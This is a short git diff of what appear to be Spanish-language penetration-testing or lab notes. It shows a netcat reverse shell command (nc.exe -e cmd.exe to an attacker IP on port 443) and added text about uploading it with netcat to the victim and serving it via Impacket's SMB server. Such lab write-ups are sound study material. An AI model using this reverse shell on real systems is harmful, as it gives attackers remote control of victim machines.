@@ -172,8 +172,9 @@ C:\temp\nc.exe 10.10.14.226 443 -e cmd.exe
 ```
 
 Este archivito se encarga de a través de [[NETCAT]] entablar una conexión con nuestra maquina atacante
-El archivo lo crearemos en nuestra maquina atacante y lo com
+El archivo lo crearemos en nuestra maquina atacante y lo subiremos a la maquina victima junto con el [[NETCAT]]
 
+En nuestra maquina atacante nos pondremos como *root* y usaremos [[SMBSERVER]] de [[IMPACKET]] 
 
 
 
